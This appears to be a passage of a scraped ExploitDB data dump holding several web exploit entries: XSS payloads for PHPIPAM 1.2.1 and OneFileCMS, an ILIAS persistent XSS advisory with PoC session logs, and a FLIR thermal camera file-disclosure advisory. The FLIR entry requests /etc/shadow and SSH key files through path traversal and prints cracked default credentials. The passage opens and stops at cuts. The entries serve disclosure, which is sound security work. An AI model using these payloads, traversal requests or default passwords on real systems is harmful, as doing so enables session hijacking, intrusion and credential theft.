ipaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/admin/replace-fields/result.php\r\nPostData:\r\nfield=description"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&search=a&csrf_cookie=892d2a900ec7fc1ba9486ec171a36f71&replace=a\r\n\r\nhttp://[Site]/phpipam/app/admin/subnets/edit.php\r\nPostData:\r\nsectionId=1&subnetId=6&action=edit&location=IPaddresses"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\n\r\nhttp://[Site]/phpipam/app/admin/subnets/edit-folder.php\r\nPostData:\r\nsectionId=2&subnetId="><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&action=add&location=IPaddresses\r\n\r\nhttp://[Site]/phpipam/app/tools/devices/devices-print.php\r\nPostData:\r\nffield=hostname"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&fval=a&direction=hostname%7Casc\r\n\r\nhttp://[Site]/phpipam/app/tools/devices/devices-print.php\r\nPostData:\r\nffield=hostname&fval=a"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>&direction=hostname%7Casc\r\n\r\nhttp://[Site]/phpipam/app/tools/devices/devices-print.php\r\nPostData:\r\nffield=hostname&fval=a&direction=hostname%7Casc"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/app/tools/subnet-masks/popup.php\r\nPostData:\r\ncloseClass=hidePopups"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nMethod: GET\r\nhttp://[Site]/phpipam/?page=tools&section=changelog&subnetId=a&sPage=50"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>\r\n\r\nhttp://[Site]/phpipam/?page=tools&section=changelog&subnetId=a"><SCRIPT>ALERT(DOCUMENT.COOKIE);</SCRIPT>', u'description': u'PHPIPAM 1.2.1 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'Saeed reza Zamanian', u'cve': [], u'source': u'ExploitDB', u'date': u'2016-09-06T00:00:00+00:00', u'_id': 40338, u'type': u'webapps', u'port': 80}

CVE: []
Description: ILIAS eLearning CMS 4.3.4 < 4.4 - Persistent Cross-Site Scripting
{u'code': u'Document Title:\r\n===============\r\nILIAS eLearning 4.3.4 & 4.4 CMS - Persistent Notes Web Vulnerability\r\n\r\n\r\nReferences (Source):\r\n====================\r\nhttp://www.vulnerability-lab.com/get_content.php?id=1122\r\n\r\n\r\nRelease Date:\r\n=============\r\n2013-10-27\r\n\r\n\r\nVulnerability Laboratory ID (VL-ID):\r\n====================================\r\n1122\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n3.9\r\n\r\n\r\nProduct & Service Introduction:\r\n===============================\r\nILIAS is a web base learning management system (LMS, VLE). Features: Courses, SCORM 1.2 and 2004, mail, forum, chat, groups, \r\npodcast, file sharing, authoring, CMS, test, wiki, personal desktop, LOM, LDAP, role based access.\r\n\r\n(Copy of the Homepage: http://sourceforge.net/projects/ilias/ )\r\n\r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nThe Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the ILIAS eLearning v4.3.4 & v4.4 CMS web-application.\r\n\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2013-10-27:    Public Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nILIAS\r\nProduct: ILIAS eLearning - Content Management System 4.3.4 & 4.4 \r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity Level:\r\n===============\r\nMedium\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\nA persistent input validation web vulnerability is detected in the ILIAS eLearning v4.3.4 & v4.4 CMS web-application.\r\nThe bug allows an attacker (remote) to implement/inject malicious own malicious persistent script codes (application side).\r\n\r\nThe persistent web vulnerability is located in the `Notes & Comments` module. Remote attackers are able to inject own \r\nmalicious script code via POST method request in the vulnerable comment or note parameters. The execute occurs in the \r\nin the comments and private notes modules of the admin panel.\r\n\r\nExploitation of the persistent web vulnerability requires low user interaction and a low privileged web-application user account.\r\nSuccessful exploitation of the vulnerability can lead to persistent session hijacking (customers), account steal via persistent \r\nweb attacks, persistent phishing or persistent module context manipulation.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] POST\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Notes\r\n\t\t\t\t[+] Comments\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] note\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] Private Notes\r\n\t\t\t\t[+] Comments Review\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\nThe persistent input validation web vulnerability can be exploited by remote attackers with low user interaction and low privileged \r\nweb-application user account. For demonstration or to reproduce ...\r\n\r\nPoC: Public Comments & private Notes\r\n\r\n<div class="ilNote">\r\n<a name="note_35"><!-- <img src="./templates/default/images/note_unlabeled.png" alt="Note" \r\ntitle="Note" border="0" style="vertical-align:text-bottom; margin-bottom:2px;"/> --></a>\r\n<span class="small light">   Last edited on 26. Oct 2013</span>\r\n<div class="ilNoteText"><h4 class="ilNoteTitle"></h4>><%20%20"<[PERSISTENT INJECTED SCRIPT CODE!]">\r\n</div></div>\r\n\r\n\r\n--- PoC Session Logs ---\r\nStatus: 302[Found]\r\nPOST http://ilias.localhost:8080/ilias.php?\r\nnote_type=1&cmd=post&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI&fallbackCmd=getNotesHTML&rtoken=2d302c4c574f61fc880f393433703e1b \r\nLoad Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] \r\nContent Size[20] \r\nMime Type[text/html]\r\n   \r\nRequest Headers:\r\nHost[ilias.localhost:8080]\r\nUser-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]\r\nAccept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]\r\nAccept-Language[en-US,en;q=0.5]\r\nAccept-Encoding[gzip, deflate]\r\nDNT[1]\r\nReferer[http://ilias.localhost:8080/ilias.php?note_type=1\ufffde_id=35&cmd=editNoteForm&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI]\r\nCookie[ilClientId=demo; PHPSESSID=mgvf9np8j9394rr0jdjg6kcqb2; iltest=cookie; authchallenge=459071aa3327de70506cb2a465507bf5]\r\nConnection[keep-alive]\r\n   \r\n\r\nPost Data:\r\nnote[%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fvulnerability-lab.com%2F%3E%40gmail.com%0D%0A%3E\r\n%22%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cdiv+style%3D%221%40gmail.com%0D%0A%3E%22%3Cscript%3Ealert%28\r\ndocument.cookie%29%3C%2Fscript%3E%40gmail.com]\r\ncmd%5BupdateNote%5D[Update+Note]\r\nnote_id[35]\r\n   \r\n\r\nResponse Headers:\r\nDate[Sat, 26 Oct 2013 21:12:44 GMT]\r\nServer[Apache/2.2.22 (Ubuntu)]\r\nX-Powered-By[PHP/5.3.10-1ubuntu3.8]\r\nExpires[Thu, 19 Nov 1981 08:52:00 GMT]\r\nCache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]\r\nPragma[no-cache]\r\nLocation[http://ilias.localhost:8080/ilias.php?note_mess=mod&cmd=showNotes&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI#notes_top]\r\nVary[Accept-Encoding]\r\nContent-Encoding[gzip]\r\nContent-Length[20]\r\nKeep-Alive[timeout=5, max=100]\r\nConnection[Keep-Alive]\r\nContent-Type[text/html]\r\n\r\n\r\n\r\nStatus: 200[OK]\r\nGET http://ilias.localhost:8080/ilias.php?note_mess=mod&cmd=showNotes&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI#notes_top \r\nLoad Flags[LOAD_DOCUMENT_URI  LOAD_REPLACE  LOAD_INITIAL_DOCUMENT_URI  ] \r\nContent Size[4997] \r\nMime Type[text/html]\r\n   \r\nRequest Headers:\r\nHost[ilias.localhost:8080]\r\nUser-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0]\r\nAccept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]\r\nAccept-Language[en-US,en;q=0.5]\r\nAccept-Encoding[gzip, deflate]\r\nDNT[1]\r\nReferer[http://ilias.localhost:8080/ilias.php?note_type=1\ufffde_id=35&cmd=editNoteForm&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI]\r\nCookie[ilClientId=demo; PHPSESSID=mgvf9np8j9394rr0jdjg6kcqb2; iltest=cookie; authchallenge=459071aa3327de70506cb2a465507bf5]\r\nConnection[keep-alive]\r\n   \r\n\r\nResponse Headers:\r\nDate[Sat, 26 Oct 2013 21:12:44 GMT]\r\nServer[Apache/2.2.22 (Ubuntu)]\r\nX-Powered-By[PHP/5.3.10-1ubuntu3.8]\r\nExpires[Thu, 19 Nov 1981 08:52:00 GMT]\r\nCache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]\r\nPragma[no-cache]\r\nP3P[CP="CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS IND UNI COM NAV INT CNT STA PRE"]\r\nVary[Accept-Encoding]\r\nContent-Encoding[gzip]\r\nContent-Length[4997]\r\nKeep-Alive[timeout=5, max=99]\r\nConnection[Keep-Alive]\r\nContent-Type[text/html; charset=UTF-8]\r\n\r\n\r\nReference(s):\r\nilias.localhost:8080/ilias.php?baseClass=ilPersonalDesktopGUI&cmd=jumpToSelectedItems\r\nilias.localhost:8080/ilias.php?note_mess=mod&cmd=showNotes&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI#notes_top\r\nilias.localhost:8080/ilias.php?note_type=1&cmd=post&cmdClass=ilnotegui&cmdNode=eu:jl:jk&baseClass=ilPersonalDesktopGUI&fallbackCmd=getNotesHTML&rtoken=x\r\n\r\n\r\nSolution - Fix & Patch:\r\n=======================\r\nThe vulnerability can be patched by a secure parse and encode of the note input field.\r\nRecognize also the affected output section were the vulnerable value executes.\r\n\r\n\r\nSecurity Risk:\r\n==============\r\nThe security risk of the persistent input validation web vulnerability is estimated as medium(+).\r\n\r\n\r\nCredits & Authors:\r\n==================\r\nVulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com)\r\n\r\n\r\nDisclaimer & Information:\r\n=========================\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.evolution-sec.com\r\nContact:    admin@vulnerability-lab.com \t- research@vulnerability-lab.com \t       - admin@evolution-sec.com\r\nSection:    www.vulnerability-lab.com/dev \t- forum.vulnerability-db.com \t\t       - magazine.vulnerability-db.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.\r\n\r\n\t\t\t\tCopyright \ufffd 2013 | Vulnerability Laboratory [Evolution Security]\r\n\r\n\r\n-- \r\nVULNERABILITY LABORATORY RESEARCH TEAM\r\nDOMAIN: www.vulnerability-lab.com\r\nCONTACT: research@vulnerability-lab.com', u'description': u'ILIAS eLearning CMS 4.3.4 < 4.4 - Persistent Cross-Site Scripting', u'platform': u'php', u'author': u'Vulnerability-Lab', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-10-29T00:00:00+00:00', u'_id': 29265, u'type': u'webapps', u'port': 0}

CVE: []
Description: FLIR Thermal Camera F/FC/PT/D - Information Disclosure
{u'code': u'FLIR Systems FLIR Thermal Camera F/FC/PT/D Multiple Information Disclosures\r\n\r\n\r\nVendor: FLIR Systems, Inc.\r\nProduct web page: http://www.flir.com\r\nAffected version: Firmware version: 8.0.0.64\r\n                  Software version: 10.0.2.43\r\n                  Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2\r\n                  FC-Series S (FC-334-NTSC)\r\n                  FC-Series ID\r\n                  FC-Series R\r\n                  PT-Series (PT-334 200562)\r\n                  D-Series\r\n                  F-Series\r\n\r\nSummary: FLIR\'s PT-Series of high-performance, multi-sensor pan/tilt cameras\r\nbring thermal and visible-light imaging together in a system that gives you\r\nvideo and control over both IP and analog networks. The PT-Series\' precision\r\npan/tilt mechanism gives you accurate pointing control while providing fully\r\nprogrammable scan patterns, radar slew-to-cue, and slew-to-alarm functions.\r\nPT-Series cameras define a new standard of performance with five models that\r\nprovide full 640x480 thermal resolution.\r\n\r\nDesc: Input passed thru several parameters is not properly verified before\r\nbeing used to read files. This can be exploited by an unauthenticated attacker\r\nto read arbitrary files from local resources.\r\n\r\n==============================================================================\r\n/var/www/data/controllers/api/xml.php:\r\n--------------------------------------\r\n\r\n68:    private function readFile($file)\r\n69:    {\r\n70:        if (!empty($file) && file_exists($file)) {\r\n71:            $xml = file_get_contents($file);\r\n72:            $this->setVar(\'result\', $xml);\r\n73:            $this->loadView(\'webservices/default\');\r\n74:        }\r\n75:        else {\r\n76:            $this->loadPageNotFound();\r\n77:        }\r\n78:    }\r\n\r\n==============================================================================\r\n\r\n\r\nTested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le\r\n           Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082\r\n           Nexus Server/2.5.29.0\r\n           Nexus Server/2.5.14.0\r\n           Nexus Server/2.5.13.0\r\n           lighttpd/1.4.28\r\n           PHP/5.4.7\r\n\r\n\r\nVulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2017-5434\r\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5434.php\r\n\r\n\r\n23.03.2017\r\n\r\n--\r\n\r\n\r\nRequests:\r\n\r\nGET http://TARGET/api/xml?file=/var/www/data/modules/legacy/config.php HTTP/1.1\r\n\r\nOutput:\r\n=====================================================================\r\n\r\n<?php\r\n$configFile = "config.ini";\r\n// load configuration params\r\n$config = parse_ini_file($configFile);\r\nif (!$config || count($config) == 0 || !isset($config["dir_nexus"]))\r\n   die("error loading configuration file...");\r\n\r\n// TODO if don\'t exist configuration, create config.ini according system and nexus setup\r\n\r\n// global\r\ndefine ("BASE",       $config["dir_nexus"]);\r\ndefine ("BIN",        $config["dir_bin"]);\r\ndefine ("TMP_DIR",    $config["dir_tmp"]);\r\ndefine ("SERVER_DIR", $config["dir_server"]);\r\ndefine ("CONF_DIR",   $config["dir_conf"]);\r\ndefine ("WEB_DIR",      "/web/");\r\ndefine ("TOOLS_DIR",    "/tools/");\r\ndefine ("HARDWARE_DIR", "/hardware/");\r\ndefine ("BACKUPS_DIR",  "/backups/");\r\ndefine ("BACKUPS_INI_DIR",  BACKUPS_DIR . "ini_files/");\r\ndefine ("BACKUPS_SYS_DIR",  BACKUPS_DIR . "system_files/");\r\n\r\n// server files\r\ndefine ("INI_FILE",        "/server/conf/server.ini");\r\ndefine ("INI_DEFAULTS", "factory.defaults");\r\ndefine ("LOG_FILE",        "server.log");\r\ndefine ("LOG_DEFAULT_PATH","/server/logs");\r\ndefine ("SCANLIST_DEFAULT_PATH","/server/sl");\r\ndefine ("LIC_FILE",        "/server/license/license.txt");\r\ndefine ("ZOOM_LUT_FILE",   "/server/conf/zoom_lut.txt");\r\ndefine ("DICTIONARY_FILE", "/server/conf/dictionary.txt");\r\ndefine ("PELOC_D_FILE",    "/server/conf/PelcoD.map");\r\ndefine ("FIRMWARE_FILE",    "firmware.sh");\r\ndefine ("HARDWARE_FILE",   BASE."/hardware/hardware.cfg");\r\n\r\n// server ini\r\ndefine ("INI_SECTION_DEVICES", "Devices");\r\ndefine ("INI_SECTION_DEVICES_IDS", " Ids");\r\ndefine ("INI_SECTION_DEVICES_INTERFACE", "INTERFACE");\r\ndefine ("INI_SECTION_INTERFACE", INI_SECTION_DEVICES_INTERFACE . " Configuration - Device ");\r\n\r\n// nexus cgi\r\ndefine ("NEXUSCGI_DEFAULTPORT", 0);\r\ndefine ("NEXUSCGI_TYPE", "Nexus CGI Interface");\r\n\r\n// web\r\ndefine ("USERS_FILE", "config/app/users.txt");\r\ndefine ("WEBVERSION", "3.4.0.0");\r\ndefine ("RECOMENDEDSERVERVERSION", "2.5.13.0");\r\n\r\n// xml files\r\ndefine ("devicesFOLDER","devices");\r\ndefine ("configFOLDER","configuration");\r\ndefine ("driversFOLDER","drivers");\r\n\r\n// system\r\n// TODO\r\ndefine ("UNZIP","/usr/bin/unzip");\r\ndefine ("ZIP","/usr/bin/zip");\r\ndefine ("SUDO", $config["sudo"]);\r\ndefine ("FLIRSYS", $config["flir_system"]);\r\ndefine ("FLIRSTP", $config["flir_setup"]);\r\ndefine ("CONFSRC", $config["config_source_dir"]);\r\ndefine ("INISRC", $config["config_source_ini_dir"]);\r\ndefine ("LOCK_FILE", "/server/conf/.locked");\r\n\r\n// service\r\ndefine ("START",  SUDO . $config["service_start"]);\r\ndefine ("STOP",   SUDO . $config["service_stop"]);\r\ndefine ("STATUS", SUDO . $config["service_status"]);\r\n\r\n// server file\r\ndefine ("SERVER_FILE", SERVER_DIR . "bin/" .$config["server_file"]);\r\ndefine ("STARTUP_FILE", $config["startup_file"]);\r\ndefine ("BOOT_FILE", $config["boot_file"]);\r\n\r\ndefine (\'LINE_FEED\', "\\n");\r\n\r\n// help\r\ndefine ("HELP_FILES", $config["help_files"]);\r\n\r\n// Debug mode\r\ndefine("DEBUG", $config["debug_mode"]);\r\n?>\r\n=====================================================================\r\n\r\n\r\nOther file requests:\r\n--------------------\r\n\r\nhttp://TARGET/api/xml?file=/etc/passwd\r\nhttp://TARGET/api/xml?file=/etc/shadow\r\nhttp://TARGET/api/xml?file=/proc/version\r\nhttp://TARGET/api/xml?file=/root/.ssh/authorized_keys\r\nhttp://TARGET/api/xml?file=/var/www/lighttpd.conf\r\nhttp://TARGET/api/xml?file=../../../../../../../../../etc/passwd\r\nhttp://TARGET/api/file/download/etc/shadow\r\nhttp://TARGET/api/file/download/etc/passwd\r\nhttp://TARGET/api/file/content/etc/shadow\r\nhttp://TARGET/api/file/content/var/log/messages\r\nhttp://TARGET/api/server/videosnap?file=../../../../../../etc/passwd\r\nhttp://TARGET/onvif/device_service\r\nhttp://TARGET/api/xml?file=/usr/local/nexus/server/conf/MessagingConfig.xml\r\nhttp://TARGET/api/server/status/full\r\nhttp://TARGET/api/xml?file=/usr/local/nexus/server/conf/FC-334-NTSC.ini\r\nhttp://TARGET/api/xml?file=/usr/local/nexus/server/conf/scheduler.xml\r\nhttp://TARGET/page/maintenance/view/server-lan\r\nhttp://TARGET/api/xml?file=/tmp/SW_versions.txt\r\nhttp://TARGET/api/xml?file=/usr/local/nexus/hardware/hardware.cfg\r\nhttp://TARGET/api/file/ini/read\r\n\r\n\r\n\r\nThe clear.sh script:\r\n--------------------\r\n\r\nhttp://TARGET/api/xml?file=/var/www/data/config/app/clear.sh\r\n\r\n\r\nOutput:\r\n=====================================================================\r\n\r\n#!/bin/bash\r\n\r\n########\r\n\r\n# is web root\r\nif [ ! -f "index.php" ]\r\nthen\r\n    echo "please, run from web root"\r\n    exit -1\r\nfi\r\n\r\n# delete old files with spaces\r\necho "deleting deprecated files (with spaces, ampersand and/or dots)"\r\nfind . -name "* *" -print0 | xargs -0 rm -f\r\n\r\necho\r\n\r\n# files to delete (deprecated, old...)\r\nFILES_TODETELE="webroot/images/models/\r\nwebroot/js/old/\r\nFLIRish.php\r\nfooter.html.php\r\ngetCgiPort.php\r\nglobal_functions.php\r\nheaderNavigation.php\r\nindex-login\r\nisUserogged.php\r\nlog_users.php\r\nmobile-loading.php\r\nmobile-meta\r\ntestApifile.php\r\nunauthorized.php\r\nusers.txt\r\nwizard.php\r\napi/\r\nbundle/\r\nconf/\r\nconfig/app/clientdesc\r\nconfig/app/update-files.sh\r\nconfig/boot_settings.json\r\nconfig/config.ini\r\nflirfiles/\r\nhelp/\r\njs/\r\nlivevideo/\r\nmaintenance/\r\nmodules/legacy/\r\nsetup/\r\nstyles/\r\ntmp/user_permissions.json\r\nxmlfiles/\r\nviews/main/maintenance/files-extra.php\r\nwebroot/images/mobile/\r\nwebroot/images/livevideo/\r\nwebroot/images/advancedBottom.png\r\nwebroot/images/advancedMiddle.png\r\nwebroot/images/advancedTop.png\r\nwebroot/images/arrowUpMini.png\r\nwebroot/images/bgBottom.png\r\nwebroot/images/bgButton.png\r\nwebroot/images/bgButtonOn.png\r\nwebroot/images/bgFullBottom.png\r\nwebroot/images/bgFullMiddle.png\r\nwebroot/images/bgFullTop.png\r\nwebroot/images/bgMiddle.png\r\nwebroot/images/bgTop.png\r\nwebroot/images/bottomBar.png\r\nwebroot/images/flir.ico\r\nwebroot/images/leftMenuButton.png\r\nwebroot/images/_logoFlirMini\r\nwebroot/images/logoFlir.png\r\nwebroot/images/logoFlirMini.png\r\nwebroot/images/radio.png\r\nwebroot/images/tabBackground.png\r\nwebroot/css/flir.base.css\r\nwebroot/css/flir.ie.css\r\nwebroot/css/flir.maintenance.css\r\nwebroot/css/flir.mobile.css\r\nwebroot/css/flir.setup.css\r\nwebroot/css/flir.video.css\r\nwebroot/css/flir.wizard.css\r\nwebroot/css/jquery/jquery.jscrollpane.css\r\nwebroot/css/jquery/jquery-ui-1.8.7.custom.css\r\nwebroot/js/PIE_uncompressed.js\r\nwebroot/js/jquery/jquery-1.5.1.min.js\r\nwebroot/js/jquery/jquery-1.5.min.js\r\nwebroot/js/jquery/plugins/jquery.ba-dotimeout.js\r\nwebroot/js/jquery/plugins/jquery.dd.js\r\nwebroot/js/jquery/plugins/jquery.forms.js\r\nwebroot/js/jquery/plugins/jquery.i18n.properties-1.0.9.js\r\nwebroot/js/jquery/plugins/jquery.jscrollpane.js\r\nwebroot/js/jquery/plugins/jquery.mousewheel.js\r\nwebroot/js/jquery/plugins/jquery.touchable.js\r\nwebroot/js/jquery/plugins/jquery.touchable.js.orig\r\nwebroot/xml/host_types.xml\r\nwebroot/xml/devices/em\r\nwebroot/xml/devices/foveal\r\nwebroot/xml/devices/foveus/foveus_Foveus.xml\r\nwebroot/xml/devices/foveus/foveus_PTZ35x140.xml\r\nwebroot/xml/devices/foveus/foveus_Voyager.xml\r\nwebroot/xml/devices/geo/geo_Georeference.xml\r\nwebroot/xml/devices/gyro/gyro_TCM2.6.xml\r\nwebroot/xml/devices/i2c\r\nwebroot/xml/devices/interface/interface_Genetec.xml\r\nwebroot/xml/devices/interface/interface_ONVIF.xml\r\nwebroot/xml/devices/ir/ir_Microcore275Z.xml\r\nwebroot/xml/devices/ir/ir_Thermovision-2000.xml\r\nwebroot/xml/devices/ir/ir_Thermovision-3000.xml\r\nwebroot/xml/devices/onboard/onboard_LTC2990.xml\r\nwebroot/xml/devices/onboard/onboard_LTC2991.xml\r\nwebroot/xml/devices/osd/osd_BOB3.xml\r\nwebroot/xml/devices/pelco/pelco_PELCO_D.xml\r\nwebroot/xml/devices/pharos/pharos_Pharos.xml\r\nwebroot/xml/devices/plat/plat_Sagebrush.xml\r\nwebroot/xml/devices/plat/plat_Vehicle.xml\r\nwebroot/xml/devices/tass/tass_TASS.xml\r\nwebroot/xml/devices/video/video_Pleora.xml\r\nwebroot/xml/devices/visca/visca_VISCA.xml\r\nwebroot/xml/devices/thermostate\r\nwebroot/xml/devices/tvi"\r\n\r\n# delete files\r\necho "clearing files"\r\nfor oldfile in $FILES_TODETELE\r\ndo\r\n    echo "deleting $oldfile"\r\n    rm -rf $oldfile\r\ndone\r\n\r\necho\r\n\r\n######\r\n\r\nexit 0\r\n=====================================================================\r\n\r\n\r\n\r\nDisclosing usernames and hashes:\r\n--------------------------------\r\n\r\nhttp://TARGET/api/xml?file=/var/www/data/config/app/users.txt\r\n\r\n\r\nuser=ee11cbb19052e40b07aac0ca060c23ee\r\nexpert=b9b83bad6bd2b4f7c40109304cf580e1\r\nadmin=15f9a55de61622e9c2a61ce72663dc08\r\nproduction=c8348b2fb046ff758256b3a5eadb4a8c\r\ncalibration=11df08a6fb66c9ae4eab03ba7db123b0\r\n\r\nee11cbb19052e40b07aac0ca060c23ee MD5 : user\r\nb9b83bad6bd2b4f7c40109304cf580e1 MD5 : expert\r\n15f9a55de61622e9c2a61ce72663dc08 MD5 : fliradmin\r\nc8348b2fb046ff758256b3a5eadb4a8c MD5 : flirproduction\r\n11df08a6fb66c9ae4eab03ba7db123b0 MD5 : flircal\r\n\r\nDefault credentials:\r\n\r\nuser:user\r\nexpert:expert\r\nadmin:fliradmin\r\nproduction:flirproduction\r\ncalibration:flircal\r\n\r\n\r\nhttp://TARGET/api/xml?file=/usr/local/nexus/server/conf/admin.passwd\r\n\r\nAeRMh9wBkCS9k\r\n\r\n\r\nProduct info:\r\n-------------\r\n\r\nhttp://TARGET/api/system/config/product\r\n\r\n{"product":{"name":"generic","sensors":[{"type":"optronic","max":1,"devices":[{"type":"video","text":{"default":"Video"},"max":4,"drivers":["uFLIRish Bullet Video","uFLIRish Bullet Video Snap","uFLIRish Bullet Video Web"]},{"type":"interface","text":{"default":"VMS Remote"},"max":3,"drivers":["Nexus CGI Interface","ONVIF v2.0","Lenel Interface"]},{"type":"ir","text":{"default":"IR"},"max":1,"drivers":["FLIR Tau v2.x","FLIR Radiometric Tau"]},{"type":"plat","text":{"default":"Pan & Tilt"},"max":1,"drivers":["Fixed Mount P&T"]},{"type":"io","text":{"default":"GPIO"},"max":1,"drivers":["Linux GPIO File Handle"]},{"type":"osd","text":{"default":"OSD"},"max":1,"drivers":["OSD uFLIRish"]},{"type":"alarm_manager","text":{"default":"Alarm Manager"},"max":1,"drivers":["Alarm Manager v3.0"]},{"type":"geo","text":{"default":"Georeference"},"max":1,"drivers":["Georeference"]}]}],"maxSensors":1,"maxDevices":255,"ports":[{"id":"\\/dev\\/ttyp0","text":{"default":"VIPE Video"}},{"id":"\\/dev\\/ttyS1","text":{"default":"CAM"}}],"aseriesfirmware":false,"mcufirmware":false,"sffc":false,"rescueMode":false},"sections":[{"type":"networking","text":{"default":"Networking"}}]}', u'description': u'FLIR Thermal Camera F/FC/PT/D - Information Disclosure', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-09-25T00:00:00+00:00', u'_id': 42786, u'type': u'webapps', u'port': 0}

CVE: []
Description: OneFileCMS 1.1.1 - Multiple Vulnerabilities
{u'code': u'# Exploit Title: OneFileCMS v.1.1.1 Multiple Remote Vulnerabilities\r\n# Google Dork: --\r\n# Date: 21/8/2011\r\n# Author: mr.pr0n (@_pr0n_)\r\n# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr\r\n# Software Link: http://onefilecms.com/download/onefilecms_site_v1.1.1.zip\r\n# Version: OneFileCMS v.1.1.1\r\n# Tested on: Linux Fedora 14\r\n\r\n===============\r\n Description\r\n===============\r\nOneFileCMS is just that. It\'s a flat, light, one file CMS (Content Management System) entirely contained in an easy-to-implement, highly customizable, database-less PHP script. Coupling a utilitarian code editor with all the basic necessities of an FTP application, OneFileCMS can maintain a whole website completely in-browser without any external programs.\r\n\r\n=======================================================\r\n [!] All vulnerabilities requires authentication. [!] \r\n=======================================================\r\n\r\n============================================\r\n0x01. Cross Site Scripting vulnerability\r\n============================================\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><marquee><h1>XSS Vulnerability<script>alert(String.fromCharCode(88,83,83))</script></h1></marquee>\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><script>document.body.innerHTML="<style>body{visibility:hidden; background:black;}</style><div style=visibility:visible;><center><h1><font color=\'white\'>Please fix your </font><font color=\'red\'> XSS </font><font color=\'white\'>!</font></h1><br>";</script>\r\n\r\n-----------------------------------------------------------------------------\r\n[!] Redirection to Google through the cross site scripting vulnerability [!]\r\n------------------------------------------------------------------------------\r\n\r\nhttp://VICTIM_SERVER/onefilecms/onefilecms.php?p=\'"><body onload="document.phising.submit();"><form name="phising" action="http://google.com"></form></body></html>\r\n\r\n...BUT, don\'t forget to encode 